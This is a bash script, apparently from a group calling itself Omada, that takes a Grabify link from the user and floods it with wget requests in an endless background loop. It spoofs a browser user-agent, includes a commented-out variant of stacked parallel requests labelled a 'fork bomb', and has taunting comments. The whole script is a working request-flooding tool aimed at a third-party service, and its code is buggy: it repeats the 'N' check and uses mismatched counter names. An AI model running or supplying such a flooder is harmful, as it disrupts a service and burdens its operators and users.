#!/bin/bash

echo '$$$$$$\                                $$\           '
echo '$$  __$$\                               $$ |          '
echo '$$ /  $$ |$$$$$$\$$$$\   $$$$$$\   $$$$$$$ | $$$$$$\  '
echo '$$ |  $$ |$$  _$$  _$$\  \____$$\ $$  __$$ | \____$$\ '
echo '$$ |  $$ |$$ / $$ / $$ | $$$$$$$ |$$ /  $$ | $$$$$$$ |'
echo '$$ |  $$ |$$ | $$ | $$ |$$  __$$ |$$ |  $$ |$$  __$$ |'
echo ' $$$$$$  |$$ | $$ | $$ |\$$$$$$$ |\$$$$$$$ |\$$$$$$$ |'
echo ' \______/ \__| \__| \__| \_______| \_______| \_______|'



# Ask user for the link they will use to get blacklisted
echo What link do you want to nuke?
echo Make sure it is http\:\/\/ instead of https\:\/\/
read -p 'LINK': LINK

# Idiot protection
echo "Are you absolutely sure you want to run this? this will send over 7 pages of requests to the grabify link before blacklisting you."
read -p 'Y/N': INPUT
echo "User input is $INPUT"
if [ $INPUT = N ]
then
echo Goodbye.
exit
fi
if [ $INPUT = N ]
then
echo Goodbye.
exit
fi


# Fucker upper
count=0
for (( ; ; ))
do
# literal fucking fork bomb LMAO
#wget $LINK -o /dev/null --user-agent="https://omada.cafe on top!" & wget $LINK -o /dev/null --user-agent="https://omada.cafe on top!" & wget $LINK -o /dev/null --user-agent="https://omada.cafe on top!" & wget $LINK -o /dev/null --user-agent="https://omada.cafe on top!" & wget $LINK -o /dev/null --user-agent="https://omada.cafe on top!" &
wget $LINK -O /dev/null --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" &
(( COUNT++ ))
echo "Omada has sent $COUNT requests up grabify's ass!"

# ANTI-OOM
(( REQ++ ))
while [ $REQ -ge 10 ]
do
#killall wget
sleep 1
REQ=0
done

done
